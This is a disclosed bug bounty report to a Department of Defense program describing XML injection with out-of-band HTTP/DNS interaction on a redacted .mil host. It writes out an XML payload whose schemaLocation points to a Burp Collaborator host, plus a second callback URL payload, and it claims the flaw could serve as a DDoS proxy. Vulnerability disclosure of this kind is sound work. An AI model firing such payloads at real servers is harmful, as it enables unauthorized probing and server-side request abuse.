# XML Injection / External Service Interaction (HTTP/DNS) On https://█████████.mil

## Report Details
- **Report ID**: 1150799
- **URL**: https://hackerone.com/reports/1150799
- **State**: Closed
- **Severity**: high
- **Submitted**: 2021-04-05T20:56:26.655Z
- **Disclosed**: 2021-06-15T19:30:12.935Z

## Reporter
- **Username**: fiveguyslover
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Greetings, I found on one of your sites an XML Injection + External service Interaction (DNS/HTTP)
Link of the vulnerable file : https://█████.mil/██████████
Payload XML Injection : 
```
<fkpxmlns="http://a.b/"xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"xsi:schemaLocation="http://a.b/http://wiiyjpk3neg58qeu4vb5j8vpcgi86x.burpcollaborator.net/fkp.xsd">fkp</fkp>
```
(please change the link of burp collaborator and + URL encode the payload)

#How to reproduce

█████
(I cut the video because the reception time is 30-40 seconds, it is not very relevant)

here is another payload that works, without XML : 

```
http://hzk9we4fcukbidprbvxdhw5iv914pudl0bo0.burpcollaborator.net/?setWarningMsg
```
(please change the link of burp collaborator)
it is also necessary to wait a little, possibly one minute.

all the ips I receive are from ███.

if you need help, don't hesitate.
fiveguyslover.

## Impact

XML Injection + We can use the weakness as a attack proxy to DDOS all Internal/external web conatiners, also could be amplified too

## System Host(s)
██████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Link of the vulnerable file : https://██████.mil/█████████

Payload XML Injection : 
```
<fkpxmlns="http://a.b/"xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"xsi:schemaLocation="http://a.b/http://wiiyjpk3neg58qeu4vb5j8vpcgi86x.burpcollaborator.net/fkp.xsd">fkp</fkp>
```
(please change the link of burp collaborator and + URL encode the payload)

here is another payload that works, without XML : 

```
http://hzk9we4fcukbidprbvxdhw5iv914pudl0bo0.burpcollaborator.net/?setWarningMsg
```

POC Attached

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
